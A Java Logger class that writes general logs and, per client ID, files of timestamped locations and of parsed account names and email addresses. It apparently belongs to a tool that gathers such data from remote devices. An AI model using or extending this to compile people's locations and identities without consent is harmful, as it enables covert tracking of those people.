import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Locale;

public class Logger {

    public static final int LOG_TYPE_PROGRESS = 0;
    public static final int LOG_TYPE_NORMAL = 1;
    public static final int LOG_TYPE_LOCATIONS = 2;
    public static final int LOG_TYPE_USERS = 3;

    private static SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MMM-dd HH:mm:ss", Locale.getDefault());
    private ArrayList<String> accountNames = new ArrayList<String>();

    OutputStreamWriter outLog, outLocations, outUsers;
    File logFile, locationsFile, userFile;
    int logType;
    String clientId;

    public Logger(int logType, String clientId) {
        this.logType = logType;
        this.clientId = clientId;
        logFile = new File("logfile" + ".log");
        locationsFile = new File(clientId, "locations.log");
        userFile = new File(clientId, "names-and-emails.log");
    }

    public void log(String str) {
        try {
            try {
                outLog = new OutputStreamWriter(new FileOutputStream(logFile, true));
                switch (logType) {
                    case LOG_TYPE_PROGRESS:
                        System.out.print(str);
                        outLog.write(str);
                        break;
                    case LOG_TYPE_NORMAL:
                        StringBuilder sb = new StringBuilder();
                        sb.append(formatter.format(Calendar.getInstance().getTime()));
                        sb.append(" ");
                        sb.append(clientId);
                        sb.append(" ");
                        sb.append(str);
                        // TODO here we should log to local logFile e.g. the threads own verbose log
                        // TODO and we should log to the global verbose log
                        // TODO if we start a Progress thread we can construct a Logger and use this class to create a downloads progress log
                        System.out.println(sb.toString());
                        outLog.write(sb.toString() + "\r\n");
                        break;
                    case LOG_TYPE_LOCATIONS:
                        StringBuilder sbLoc = new StringBuilder();
                        sbLoc.append(formatter.format(Calendar.getInstance().getTime()));
                        sbLoc.append(" ");
                        sbLoc.append(clientId);
                        sbLoc.append(" ");
                        sbLoc.append(str);
                        sbLoc.append("\r\n");
                        FileUtils.writeStringToFile(locationsFile, sbLoc.toString(), "UTF-8", true);
                        break;
                    case LOG_TYPE_USERS:
                        String email, guessName = "";
                        String accountName = str.substring(
                                str.indexOf("name=") + "name=".length(),
                                str.indexOf(",")
                        );
                        if(accountName.contains("@") && accountName.contains(".")){
                            // entry is probably an email address
                            accountName = "Email: " + accountName;
                        } else if (!accountName.matches("WhatsApp") && !accountName.matches("LinkedIn")){
                            // entry is probably a name TODO more company names like the above
                            accountName = "Name : " + accountName;
                        } else {
                            return;
                        }
                        if(!accountNames.contains(accountName)){
                            accountNames.add(accountName);
                        }
                            StringBuilder sbUsers = new StringBuilder();
                            sbUsers.append(formatter.format(Calendar.getInstance().getTime()));
                            sbUsers.append(" ");
                            sbUsers.append(clientId);
                            sbUsers.append("\r\n");
                            // Try to get some human readable contact info
                            for(String n : accountNames) {
                                sbUsers.append(n);
                                sbUsers.append("\r\n");
                            }
                            FileUtils.writeStringToFile(userFile, sbUsers.toString(), "UTF-8", false);
                        break;
                }
            } finally {
                if (outLog != null) {
                    outLog.flush();
                    outLog.close();
                }
                if (outLocations != null) {
                    outLocations.flush();
                    outLocations.close();
                }
                if (outUsers != null) {
                    outUsers.flush();
                    outUsers.close();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}